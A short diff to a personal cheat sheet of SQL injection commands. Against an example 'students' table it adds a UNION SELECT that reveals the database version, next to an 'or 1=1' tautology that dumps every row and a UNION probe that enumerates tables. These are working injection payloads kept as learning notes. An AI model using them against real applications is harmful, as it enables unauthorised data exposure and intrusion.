@@ -2,6 +2,8 @@ SQL Injection commands,
 
 Assume we have a table students with 5 columns
 
+select * from students where Student_ID = 1 UNION SELECT 1,1,1,1,@@version;  --> Will show the DB verison
+
 select * from students where Student_ID = 1 or 1=1;  --> Will give all columns data from the selected table
 
 select * from students where Student_ID = 1 UNION SELECT 1 FROM <TABLE_NAME>;  --> To enumerate if the specified table is present or not 
